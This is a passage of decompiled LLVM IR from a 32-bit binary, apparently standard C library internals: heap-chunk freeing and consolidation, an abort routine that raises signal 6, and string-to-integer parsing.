  store i32 %v1_805131d, i32* %eax.global-to-local, align 4
  %v2_8051320 = add i32 %v1_80512ed, %v1_80512dd
  store i32 %v2_8051320, i32* @esi, align 4
  store i8 %v3_805131d, i8* @global_var_8053340.188, align 64
  %v1_8051328 = add i32 %v2_8051320, 4
  %v2_8051328 = inttoptr i32 %v1_8051328 to i32*
  %v3_8051328 = load i32, i32* %v2_8051328, align 4
  store i32 %v3_8051328, i32* %eax.global-to-local, align 4
  %v2_805132f = inttoptr i32 %v1_80512e8 to i8*
  %v3_805132f = load i8, i8* %v2_805132f, align 1
  %v4_805132f = urem i8 %v3_805132f, 2
  %v5_805132f = icmp eq i8 %v4_805132f, 0
  %v1_8051333 = icmp eq i1 %v5_805132f, false
  br i1 %v1_8051333, label %dec_label_pc_8051356, label %dec_label_pc_8051335

dec_label_pc_8051335:                             ; preds = %dec_label_pc_805131d
  %v2_8051335 = inttoptr i32 %v1_80512dd to i32*
  %v3_8051335 = load i32, i32* %v2_8051335, align 4
  store i32 %v3_8051335, i32* @ebp, align 4
  %v2_805133a = sub i32 %v1_80512dd, %v3_8051335
  store i32 %v2_805133a, i32* %eax.global-to-local, align 4
  %v1_805133c = add i32 %v2_805133a, 8
  %v2_805133c = inttoptr i32 %v1_805133c to i32*
  %v3_805133c = load i32, i32* %v2_805133c, align 4
  store i32 %v3_805133c, i32* @edi, align 4
  %v1_805133f = add i32 %v2_805133a, 12
  %v2_805133f = inttoptr i32 %v1_805133f to i32*
  %v3_805133f = load i32, i32* %v2_805133f, align 4
  store i32 %v3_805133f, i32* @edx, align 4
  %v1_8051342 = add i32 %v3_805133c, 12
  %v2_8051342 = inttoptr i32 %v1_8051342 to i32*
  %v3_8051342 = load i32, i32* %v2_8051342, align 4
  store i32 %v3_8051342, i32* @ecx, align 4
  %v12_8051345 = icmp eq i32 %v3_8051342, %v2_805133a
  %v1_8051347 = icmp eq i1 %v12_8051345, false
  br i1 %v1_8051347, label %dec_label_pc_8051385, label %dec_label_pc_8051349

dec_label_pc_8051349:                             ; preds = %dec_label_pc_8051335
  %v1_8051349 = add i32 %v3_805133f, 8
  %v2_8051349 = inttoptr i32 %v1_8051349 to i32*
  %v3_8051349 = load i32, i32* %v2_8051349, align 4
  %v15_8051349 = icmp eq i32 %v3_8051349, %v3_8051342
  %v1_805134c = icmp eq i1 %v15_8051349, false
  br i1 %v1_805134c, label %dec_label_pc_8051385, label %dec_label_pc_805134e

dec_label_pc_805134e:                             ; preds = %dec_label_pc_8051349
  %v2_805134e = add i32 %v3_8051335, %v1_80512ed
  store i32 %v2_805134e, i32* @ebx, align 4
  store i32 %v3_805133f, i32* %v2_8051342, align 4
  %v0_8051353 = load i32, i32* @edi, align 4
  %v1_8051353 = load i32, i32* @edx, align 4
  %v2_8051353 = add i32 %v1_8051353, 8
  %v3_8051353 = inttoptr i32 %v2_8051353 to i32*
  store i32 %v0_8051353, i32* %v3_8051353, align 4
  %v0_805135d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051356

dec_label_pc_8051356:                             ; preds = %dec_label_pc_805131d, %dec_label_pc_805134e
  %v1_8051369 = phi i32 [ %v2_8051320, %dec_label_pc_805131d ], [ %v0_805135d.pre, %dec_label_pc_805134e ]
  %v1_805135a = and i32 %v3_8051328, -4
  store i32 %v1_805135a, i32* @ebp, align 4
  %v1_805135d = load i32, i32* @global_var_805336c.189, align 4
  %v12_805135d = icmp eq i32 %v1_8051369, %v1_805135d
  br i1 %v12_805135d, label %dec_label_pc_80513b7, label %dec_label_pc_8051365

dec_label_pc_8051365:                             ; preds = %dec_label_pc_8051356
  %v2_8051365 = add i32 %v1_8051369, 4
  %v3_8051365 = add i32 %v2_8051365, %v1_805135a
  %v4_8051365 = inttoptr i32 %v3_8051365 to i32*
  %v5_8051365 = load i32, i32* %v4_8051365, align 4
  store i32 %v5_8051365, i32* %eax.global-to-local, align 4
  %v3_8051369 = inttoptr i32 %v2_8051365 to i32*
  store i32 %v1_805135a, i32* %v3_8051369, align 4
  %v0_805136c = load i32, i32* %eax.global-to-local, align 4
  %v1_805136c = urem i32 %v0_805136c, 2
  %v2_805136c = icmp eq i32 %v1_805136c, 0
  store i32 %v1_805136c, i32* %eax.global-to-local, align 4
  %v1_8051371 = icmp eq i1 %v2_805136c, false
  br i1 %v1_8051371, label %dec_label_pc_8051392, label %dec_label_pc_8051373

dec_label_pc_8051373:                             ; preds = %dec_label_pc_8051365
  %v0_8051373 = load i32, i32* @esi, align 4
  %v1_8051373 = add i32 %v0_8051373, 8
  %v2_8051373 = inttoptr i32 %v1_8051373 to i32*
  %v3_8051373 = load i32, i32* %v2_8051373, align 4
  store i32 %v3_8051373, i32* @edx, align 4
  %v1_8051376 = add i32 %v0_8051373, 12
  %v2_8051376 = inttoptr i32 %v1_8051376 to i32*
  %v3_8051376 = load i32, i32* %v2_8051376, align 4
  store i32 %v3_8051376, i32* %eax.global-to-local, align 4
  %v1_8051379 = add i32 %v3_8051373, 12
  %v2_8051379 = inttoptr i32 %v1_8051379 to i32*
  %v3_8051379 = load i32, i32* %v2_8051379, align 4
  store i32 %v3_8051379, i32* @edi, align 4
  %v12_805137c = icmp eq i32 %v3_8051379, %v0_8051373
  %v1_805137e = icmp eq i1 %v12_805137c, false
  br i1 %v1_805137e, label %dec_label_pc_8051385, label %dec_label_pc_8051380

dec_label_pc_8051380:                             ; preds = %dec_label_pc_8051373
  %v1_8051380 = add i32 %v3_8051376, 8
  %v2_8051380 = inttoptr i32 %v1_8051380 to i32*
  %v3_8051380 = load i32, i32* %v2_8051380, align 4
  %v15_8051380 = icmp eq i32 %v3_8051380, %v3_8051379
  br i1 %v15_8051380, label %dec_label_pc_805138a, label %dec_label_pc_8051385

dec_label_pc_8051385:                             ; preds = %dec_label_pc_8051380, %dec_label_pc_8051373, %dec_label_pc_8051349, %dec_label_pc_8051335
  %v0_8051385 = call i32 @function_8051445()
  store i32 %v0_8051385, i32* %eax.global-to-local, align 4
  %v1_805138a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805138a

dec_label_pc_805138a:                             ; preds = %dec_label_pc_8051380, %dec_label_pc_8051385
  %v1_805138a = phi i32 [ %v3_8051373, %dec_label_pc_8051380 ], [ %v1_805138a.pre, %dec_label_pc_8051385 ]
  %v0_805138a = phi i32 [ %v3_8051376, %dec_label_pc_8051380 ], [ %v0_8051385, %dec_label_pc_8051385 ]
  %v2_805138a = add i32 %v1_805138a, 12
  %v3_805138a = inttoptr i32 %v2_805138a to i32*
  store i32 %v0_805138a, i32* %v3_805138a, align 4
  %v0_805138d = load i32, i32* @edx, align 4
  %v1_805138d = load i32, i32* %eax.global-to-local, align 4
  %v2_805138d = add i32 %v1_805138d, 8
  %v3_805138d = inttoptr i32 %v2_805138d to i32*
  store i32 %v0_805138d, i32* %v3_805138d, align 4
  %v0_8051390 = load i32, i32* @ebx, align 4
  %v1_8051390 = load i32, i32* @ebp, align 4
  %v2_8051390 = add i32 %v1_8051390, %v0_8051390
  store i32 %v2_8051390, i32* @ebx, align 4
  br label %dec_label_pc_8051392

dec_label_pc_8051392:                             ; preds = %dec_label_pc_8051365, %dec_label_pc_805138a
  %v0_8051392 = load i32, i32* @global_var_805337c.207, align 4
  store i32 %v0_8051392, i32* %eax.global-to-local, align 4
  %v0_8051397 = load i32, i32* @ecx, align 4
  %v1_8051397 = add i32 %v0_8051397, 12
  %v2_8051397 = inttoptr i32 %v1_8051397 to i32*
  store i32 ptrtoint (i32* @global_var_8053374.191 to i32), i32* %v2_8051397, align 4
  %v0_805139e = load i32, i32* %eax.global-to-local, align 4
  %v1_805139e = load i32, i32* @ecx, align 4
  %v2_805139e = add i32 %v1_805139e, 8
  %v3_805139e = inttoptr i32 %v2_805139e to i32*
  store i32 %v0_805139e, i32* %v3_805139e, align 4
  %v0_80513a1 = load i32, i32* @ebx, align 4
  %v1_80513a1 = load i32, i32* @ecx, align 4
  %v3_80513a1 = add i32 %v1_80513a1, %v0_80513a1
  %v4_80513a1 = inttoptr i32 %v3_80513a1 to i32*
  store i32 %v0_80513a1, i32* %v4_80513a1, align 4
  %v0_80513a4 = load i32, i32* @ecx, align 4
  %v1_80513a4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80513a4 = add i32 %v1_80513a4, 12
  %v3_80513a4 = inttoptr i32 %v2_80513a4 to i32*
  store i32 %v0_80513a4, i32* %v3_80513a4, align 4
  %v0_80513a7 = load i32, i32* @ebx, align 4
  %v1_80513a9 = or i32 %v0_80513a7, 1
  store i32 %v1_80513a9, i32* %eax.global-to-local, align 4
  %v0_80513ac = load i32, i32* @ecx, align 4
  store i32 %v0_80513ac, i32* @global_var_805337c.207, align 4
  %v2_80513b2 = add i32 %v0_80513ac, 4
  %v3_80513b2 = inttoptr i32 %v2_80513b2 to i32*
  store i32 %v1_80513a9, i32* %v3_80513b2, align 4
  br label %dec_label_pc_80513c7

dec_label_pc_80513b7:                             ; preds = %dec_label_pc_8051356
  %v0_80513b7 = load i32, i32* @ebx, align 4
  %v2_80513b7 = add i32 %v0_80513b7, %v1_805135a
  store i32 %v2_80513b7, i32* @ebx, align 4
  %v1_80513bb = or i32 %v2_80513b7, 1
  store i32 %v1_80513bb, i32* %eax.global-to-local, align 4
  %v1_80513be = load i32, i32* @ecx, align 4
  %v2_80513be = add i32 %v1_80513be, 4
  %v3_80513be = inttoptr i32 %v2_80513be to i32*
  store i32 %v1_80513bb, i32* %v3_80513be, align 4
  %v0_80513c1 = load i32, i32* @ecx, align 4
  store i32 %v0_80513c1, i32* @global_var_805336c.189, align 4
  br label %dec_label_pc_80513c7

dec_label_pc_80513c7:                             ; preds = %dec_label_pc_8051392, %dec_label_pc_80513b7
  %v0_80513c7 = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_80513c7, 131072
  br i1 %tmp21, label %dec_label_pc_805142c, label %dec_label_pc_80513cf

dec_label_pc_80513cf:                             ; preds = %dec_label_pc_80513c7
  %v0_80513cf = load i8, i8* @global_var_8053340.188, align 64
  %v1_80513cf = and i8 %v0_80513cf, 2
  %v2_80513cf = icmp eq i8 %v1_80513cf, 0
  br i1 %v2_80513cf, label %dec_label_pc_80513e8, label %dec_label_pc_80513d8

dec_label_pc_80513d8:                             ; preds = %dec_label_pc_80513cf
  %v2_80513e0 = call i32 @function_8051101(i32* bitcast (i8* @global_var_8053340.188 to i32*))
  store i32 %v2_80513e0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513e8

dec_label_pc_80513e8:                             ; preds = %dec_label_pc_80513cf, %dec_label_pc_80513d8
  %v0_80513e8 = load i32, i32* @global_var_805336c.189, align 4
  store i32 %v0_80513e8, i32* %eax.global-to-local, align 4
  %v1_80513ed = add i32 %v0_80513e8, 4
  %v2_80513ed = inttoptr i32 %v1_80513ed to i32*
  %v3_80513ed = load i32, i32* %v2_80513ed, align 4
  %v1_80513f0 = and i32 %v3_80513ed, -4
  store i32 %v1_80513f0, i32* %eax.global-to-local, align 4
  %v1_80513f3 = load i32, i32* @global_var_8053684.205, align 4
  %v7_80513f3 = icmp ult i32 %v1_80513f0, %v1_80513f3
  br i1 %v7_80513f3, label %dec_label_pc_805142c, label %dec_label_pc_80513fb

dec_label_pc_80513fb:                             ; preds = %dec_label_pc_80513e8
  store i32 ptrtoint (i8* @global_var_8053340.188 to i32), i32* @edx, align 4
  %v0_8051400 = load i32, i32* @global_var_8053688.203, align 8
  store i32 %v0_8051400, i32* @eax, align 4
  %v0_8051405 = call i32 @function_8051074()
  store i32 %v0_8051405, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805142c

dec_label_pc_805140c:                             ; preds = %dec_label_pc_8051314
  %v2_805140c = inttoptr i32 %v1_80512dd to i32*
  %v3_805140c = load i32, i32* %v2_805140c, align 4
  %v0_805140f = load i32, i32* @global_var_8053690.196, align 16
  %v1_805140f = add i32 %v0_805140f, -1
  store i32 %v1_805140f, i32* @global_var_8053690.196, align 16
  %v2_8051415 = add i32 %v3_805140c, %v1_80512ed
  store i32 %v2_8051415, i32* %eax.global-to-local, align 4
  %v2_8051418 = sub i32 %v1_80512dd, %v3_805140c
  %v0_805141e = load i32, i32* @global_var_80536a4.199, align 4
  %v2_805141e = sub i32 %v0_805141e, %v2_8051415
  store i32 %v2_805141e, i32* @global_var_80536a4.199, align 4
  %v4_8051424 = inttoptr i32 %v2_8051418 to i32*
  %v5_8051424 = call i32 @function_8052175(i32* %v4_8051424, i32 %v2_8051415, i32 %v1_80512ed, i32 %v1_80512ed)
  store i32 %v5_8051424, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805142c

dec_label_pc_805142c:                             ; preds = %dec_label_pc_80513e8, %dec_label_pc_80513c7, %dec_label_pc_80513fb, %dec_label_pc_80512f4, %dec_label_pc_805140c
  store i32 %v2_80512c7, i32* @eax, align 4
  %v2_8051435 = call i32 @function_8051a10(i32 %v2_80512c7, i32 1)
  store i32 %v2_8051435, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805143d

dec_label_pc_805143d:                             ; preds = %dec_label_pc_80512a9, %dec_label_pc_805142c
  %.0 = phi i32 [ undef, %dec_label_pc_80512a9 ], [ %v2_8051435, %dec_label_pc_805142c ]
  store i32 %v0_80512ac, i32* @ebx, align 4
  store i32 %v0_80512ab, i32* @esi, align 4
  store i32 %v0_80512aa, i32* @edi, align 4
  store i32 %v0_80512a9, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_805140c, { 1, 0 }
  uselistorder i32 %v0_80513a1, { 1, 0 }
  uselistorder i32 %v1_805136c, { 1, 0 }
  uselistorder i32 %v2_8051365, { 1, 0 }
  uselistorder i32 %v1_805135a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8051369, { 1, 0 }
  uselistorder i32 %v1_80512ed, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_80512e8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80512dd, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8053340.188 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8053374.191 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805336c.189, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i8* @global_var_8053340.188 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8053340.188, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805303c.187 to i32), { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_805143d, { 1, 0 }
  uselistorder label %dec_label_pc_805142c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_80513e8, { 1, 0 }
  uselistorder label %dec_label_pc_80513c7, { 1, 0 }
  uselistorder label %dec_label_pc_8051392, { 1, 0 }
  uselistorder label %dec_label_pc_805138a, { 1, 0 }
  uselistorder label %dec_label_pc_8051356, { 1, 0 }
}

define i32 @function_8051445() local_unnamed_addr {
dec_label_pc_8051460.lr.ph:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8051451 = call i32 @function_8051a0d(i32 ptrtoint (i32* @global_var_8053054.208 to i32))
  %v12_805145b = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805146048 = add i32 %v12_805145b, 276
  %v5_805146049 = inttoptr i32 %v4_805146048 to i32*
  store i32 0, i32* %v5_805146049, align 4
  %v0_805146b50 = load i32, i32* %eax.global-to-local, align 4
  %v1_805146b51 = add i32 %v0_805146b50, -1
  %v9_805146b52 = icmp slt i32 %v1_805146b51, 0
  store i32 %v1_805146b51, i32* %eax.global-to-local, align 4
  %v1_805146c53 = icmp eq i1 %v9_805146b52, false
  br i1 %v1_805146c53, label %dec_label_pc_8051460.dec_label_pc_8051460_crit_edge, label %dec_label_pc_805146e

dec_label_pc_8051460.dec_label_pc_8051460_crit_edge: ; preds = %dec_label_pc_8051460.lr.ph, %dec_label_pc_8051460.dec_label_pc_8051460_crit_edge
  %v1_805146b54 = phi i32 [ %v1_805146b, %dec_label_pc_8051460.dec_label_pc_8051460_crit_edge ], [ %v1_805146b51, %dec_label_pc_8051460.lr.ph ]
  %v0_8051460.pre = load i32, i32* @esp, align 4
  %v2_8051460 = mul i32 %v1_805146b54, 4
  %v3_8051460 = add i32 %v0_8051460.pre, 152
  %v4_8051460 = add i32 %v3_8051460, %v2_8051460
  %v5_8051460 = inttoptr i32 %v4_8051460 to i32*
  store i32 0, i32* %v5_8051460, align 4
  %v0_805146b = load i32, i32* %eax.global-to-local, align 4
  %v1_805146b = add i32 %v0_805146b, -1
  %v9_805146b = icmp slt i32 %v1_805146b, 0
  store i32 %v1_805146b, i32* %eax.global-to-local, align 4
  %v1_805146c = icmp eq i1 %v9_805146b, false
  br i1 %v1_805146c, label %dec_label_pc_8051460.dec_label_pc_8051460_crit_edge, label %dec_label_pc_805146e

dec_label_pc_805146e:                             ; preds = %dec_label_pc_8051460.dec_label_pc_8051460_crit_edge, %dec_label_pc_8051460.lr.ph
  %v0_805146e = load i32, i32* @ebx, align 4
  %v2_8051472 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8051472, i32* @ebx, align 4
  %v4_805147a = call i32 @function_805049e(i32 %v2_8051472, i32 6, i32 %v0_805146e, i32 %v0_805146e)
  store i32 %v4_805147a, i32* %eax.global-to-local, align 4
  %v1_8051482 = icmp eq i32 %v4_805147a, 0
  %v1_8051484 = icmp eq i1 %v1_8051482, false
  br i1 %v1_8051484, label %dec_label_pc_8051494, label %dec_label_pc_8051486

dec_label_pc_8051486:                             ; preds = %dec_label_pc_805146e
  %v3_805148c = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_805148c = call i32 @function_804fdbd(i32 1, %_TYPEDEF_sigset_t* %v3_805148c, i32 0)
  store i32 %v4_805148c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051494

dec_label_pc_8051494:                             ; preds = %dec_label_pc_805146e, %dec_label_pc_8051486
  %v2_80514cc23 = phi i32 [ %v4_805147a, %dec_label_pc_805146e ], [ %v4_805148c, %dec_label_pc_8051486 ]
  %v0_8051494 = load i8, i8* @global_var_80530dc.209, align 4
  %v1_8051494 = icmp eq i8 %v0_8051494, 0
  %v1_805149b = icmp eq i1 %v1_8051494, false
  br i1 %v1_805149b, label %dec_label_pc_80514cc, label %dec_label_pc_805149d

dec_label_pc_805149d:                             ; preds = %dec_label_pc_8051494
  store i8 1, i8* @global_var_80530dc.209, align 4
  br label %dec_label_pc_80514a4

dec_label_pc_80514a4:                             ; preds = %dec_label_pc_805150b, %dec_label_pc_805149d
  %v1_80514ac = call i32 @function_8051a0d(i32 ptrtoint (i32* @global_var_8053054.208 to i32))
  store i32 %v1_80514ac, i32* %eax.global-to-local, align 4
  %v1_80514b8 = call i32 @function_8050370(i32 6)
  store i32 %v1_80514b8, i32* %eax.global-to-local, align 4
  %v1_80514c4 = call i32 @function_8051a0d(i32 ptrtoint (i32* @global_var_8053054.208 to i32))
  store i32 %v1_80514c4, i32* %eax.global-to-local, align 4
  %v0_80514cc.pre = load i8, i8* @global_var_80530dc.209, align 4
  br label %dec_label_pc_80514cc

dec_label_pc_80514cc:                             ; preds = %dec_label_pc_8051494, %dec_label_pc_80514a4
  %v2_80514cc = phi i32 [ %v2_80514cc23, %dec_label_pc_8051494 ], [ %v1_80514c4, %dec_label_pc_80514a4 ]
  %v0_80514cc = phi i8 [ %v0_8051494, %dec_label_pc_8051494 ], [ %v0_80514cc.pre, %dec_label_pc_80514a4 ]
  %v1_80514cc = zext i8 %v0_80514cc to i32
  %v3_80514cc = and i32 %v2_80514cc, -256
  %v4_80514cc = or i32 %v1_80514cc, %v3_80514cc
  store i32 %v4_80514cc, i32* %eax.global-to-local, align 4
  %v10_80514d1 = icmp eq i8 %v0_80514cc, 1
  %v1_80514d3 = icmp eq i1 %v10_80514d1, false
  br i1 %v1_80514d3, label %dec_label_pc_805152d, label %dec_label_pc_8051500.lr.ph

dec_label_pc_8051500.lr.ph:                       ; preds = %dec_label_pc_80514cc
  store i8 2, i8* @global_var_80530dc.209, align 4
  %v2_80514e4 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80514e4, i32* %eax.global-to-local, align 4
  %v3_80514e9 = bitcast i32* %stack_var_-272 to i8*
  %v4_80514e9 = call i32 @function_80500da(i8* %v3_80514e9, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805150040 = add i32 %v12_805145b, 140
  %v5_805150041 = inttoptr i32 %v4_805150040 to i32*
  store i32 -1, i32* %v5_805150041, align 4
  %v0_805150842 = load i32, i32* %eax.global-to-local, align 4
  %v1_805150843 = add i32 %v0_805150842, -1
  %v9_805150844 = icmp slt i32 %v1_805150843, 0
  store i32 %v1_805150843, i32* %eax.global-to-local, align 4
  %v1_805150945 = icmp eq i1 %v9_805150844, false
  br i1 %v1_805150945, label %dec_label_pc_8051500.dec_label_pc_8051500_crit_edge, label %dec_label_pc_805150b

dec_label_pc_8051500.dec_label_pc_8051500_crit_edge: ; preds = %dec_label_pc_8051500.lr.ph, %dec_label_pc_8051500.dec_label_pc_8051500_crit_edge
  %v1_805150846 = phi i32 [ %v1_8051508, %dec_label_pc_8051500.dec_label_pc_8051500_crit_edge ], [ %v1_805150843, %dec_label_pc_8051500.lr.ph ]
  %v0_8051500.pre = load i32, i32* @esp, align 4
  %v2_8051500 = mul i32 %v1_805150846, 4
  %v3_8051500 = add i32 %v0_8051500.pre, 16
  %v4_8051500 = add i32 %v3_8051500, %v2_8051500
  %v5_8051500 = inttoptr i32 %v4_8051500 to i32*
  store i32 -1, i32* %v5_8051500, align 4
  %v0_8051508 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051508 = add i32 %v0_8051508, -1
  %v9_8051508 = icmp slt i32 %v1_8051508, 0
  store i32 %v1_8051508, i32* %eax.global-to-local, align 4
  %v1_8051509 = icmp eq i1 %v9_8051508, false
  br i1 %v1_8051509, label %dec_label_pc_8051500.dec_label_pc_8051500_crit_edge, label %dec_label_pc_805150b

dec_label_pc_805150b:                             ; preds = %dec_label_pc_8051500.dec_label_pc_8051500_crit_edge, %dec_label_pc_8051500.lr.ph
  store i32 %v2_80514e4, i32* %eax.global-to-local, align 4
  %v4_8051520 = call i32 @function_8051c4f(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8051520, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80514a4

dec_label_pc_805152d:                             ; preds = %dec_label_pc_80514cc
  %v10_805152d = icmp eq i8 %v0_80514cc, 2
  %v1_805152f = icmp eq i1 %v10_805152d, false
  br i1 %v1_805152f, label %dec_label_pc_8051539, label %dec_label_pc_8051539.thread

dec_label_pc_8051539.thread:                      ; preds = %dec_label_pc_805152d
  store i8 3, i8* @global_var_80530dc.209, align 4
  br label %dec_label_pc_8051542

dec_label_pc_8051539:                             ; preds = %dec_label_pc_805152d
  %v9_8051539 = icmp eq i8 %v0_80514cc, 3
  %v1_8051540 = icmp eq i1 %v9_8051539, false
  br i1 %v1_8051540, label %dec_label_pc_8051553, label %dec_label_pc_8051542

dec_label_pc_8051542:                             ; preds = %dec_label_pc_8051539.thread, %dec_label_pc_8051539
  store i8 4, i8* @global_var_80530dc.209, align 4
  %v1_805154e = call i32 @function_8051db0(i32 127)
  unreachable

dec_label_pc_8051553:                             ; preds = %dec_label_pc_8051539, %dec_label_pc_8051553
  br label %dec_label_pc_8051553

; uselistorder directives
  uselistorder i32 %v1_8051508, { 2, 1, 0 }
  uselistorder i32 %v1_805146b, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 15, 16, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 17, 18, 13, 14 }
  uselistorder i8 3, { 0, 3, 1, 2 }
  uselistorder i8 2, { 7, 9, 10, 0, 11, 1, 2, 3, 4, 5, 12, 13, 6, 14, 8 }
  uselistorder i8* @global_var_80530dc.209, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8051553, { 1, 0 }
  uselistorder label %dec_label_pc_8051542, { 1, 0 }
  uselistorder label %dec_label_pc_8051500.dec_label_pc_8051500_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_80514cc, { 1, 0 }
  uselistorder label %dec_label_pc_8051494, { 1, 0 }
  uselistorder label %dec_label_pc_8051460.dec_label_pc_8051460_crit_edge, { 1, 0 }
}

define i32 @function_8051556() local_unnamed_addr {
dec_label_pc_8051556:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v3_8051561 = call i32 @function_805156a(i32 %tmp, i32 0, i32 10)
  ret i32 %v3_8051561
}

define i32 @function_805156a(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805156a:
  %v4_805157b = inttoptr i32 %arg1 to i8*
  %v5_805157b = call i32 @function_8051584(i8* %v4_805157b, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_805157b
}

define i32 @function_8051584(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051584:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_8051587 = load i32, i32* @ebx, align 4
  store i32 %v0_8051587, i32* %stack_var_-16, align 4
  %v0_805158b = load i32, i32* bitcast (i32** @global_var_8053088.211 to i32*), align 8
  store i32 %v0_805158b, i32* %edx.global-to-local, align 4
  %v4_8051591 = ptrtoint i8* %arg1 to i32
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_8051591, i32* %ebx.global-to-local, align 4
  %v2_805159e7 = load i8, i8* %arg1, align 1
  %v3_805159e8 = sext i8 %v2_805159e7 to i32
  store i32 %v3_805159e8, i32* %eax.global-to-local, align 4
  %v2_80515a110 = mul nsw i32 %v3_805159e8, 2
  %v3_80515a111 = add i32 %v2_80515a110, %v0_805158b
  %v4_80515a112 = inttoptr i32 %v3_80515a111 to i8*
  %v5_80515a113 = load i8, i8* %v4_80515a112, align 1
  %v6_80515a114 = and i8 %v5_80515a113, 32
  %v7_80515a115 = icmp eq i8 %v6_80515a114, 0
  %v1_80515a516 = icmp eq i1 %v7_80515a115, false
  br i1 %v1_80515a516, label %dec_label_pc_805159d, label %dec_label_pc_80515a7

dec_label_pc_805159d:                             ; preds = %dec_label_pc_8051584, %dec_label_pc_805159d
  %v0_805159d = phi i32 [ %v1_805159d, %dec_label_pc_805159d ], [ %v4_8051591, %dec_label_pc_8051584 ]
  %v1_805159d = add i32 %v0_805159d, 1
  store i32 %v1_805159d, i32* %ebx.global-to-local, align 4
  %v1_805159e = inttoptr i32 %v1_805159d to i8*
  %v2_805159e = load i8, i8* %v1_805159e, align 1
  %v3_805159e = sext i8 %v2_805159e to i32
  store i32 %v3_805159e, i32* %eax.global-to-local, align 4
  %v2_80515a1 = mul nsw i32 %v3_805159e, 2
  %v3_80515a1 = add i32 %v2_80515a1, %v0_805158b
  %v4_80515a1 = inttoptr i32 %v3_80515a1 to i8*
  %v5_80515a1 = load i8, i8* %v4_80515a1, align 1
  %v6_80515a1 = and i8 %v5_80515a1, 32
  %v7_80515a1 = icmp eq i8 %v6_80515a1, 0
  %v1_80515a5 = icmp eq i1 %v7_80515a1, false
  br i1 %v1_80515a5, label %dec_label_pc_805159d, label %dec_label_pc_80515a7

dec_label_pc_80515a7:                             ; preds = %dec_label_pc_805159d, %dec_label_pc_8051584
  %v0_80515bc = phi i32 [ %v4_8051591, %dec_label_pc_8051584 ], [ %v1_805159d, %dec_label_pc_805159d ]
  %v4_80515d5 = phi i32 [ %v3_805159e8, %dec_label_pc_8051584 ], [ %v3_805159e, %dec_label_pc_805159d ]
  %v9_80515a7 = icmp eq i32 %v4_80515d5, 43
  br i1 %v9_80515a7, label %dec_label_pc_80515bc, label %dec_label_pc_80515ac

dec_label_pc_80515ac:                             ; preds = %dec_label_pc_80515a7
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_80515ae = icmp eq i32 %v4_80515d5, 45
  %v1_80515b1 = icmp eq i1 %v9_80515ae, false
  br i1 %v1_80515b1, label %dec_label_pc_80515bd, label %dec_label_pc_80515bc

dec_label_pc_80515bc:                             ; preds = %dec_label_pc_80515a7, %dec_label_pc_80515ac
  %storemerge2 = phi i32 [ 1, %dec_label_pc_80515ac ], [ 0, %dec_label_pc_80515a7 ]
  store i32 %storemerge2, i32* %ebp.global-to-local, align 4
  %v1_80515bc = add i32 %v0_80515bc, 1
  store i32 %v1_80515bc, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80515bd

dec_label_pc_80515bd:                             ; preds = %dec_label_pc_80515ac, %dec_label_pc_80515bc
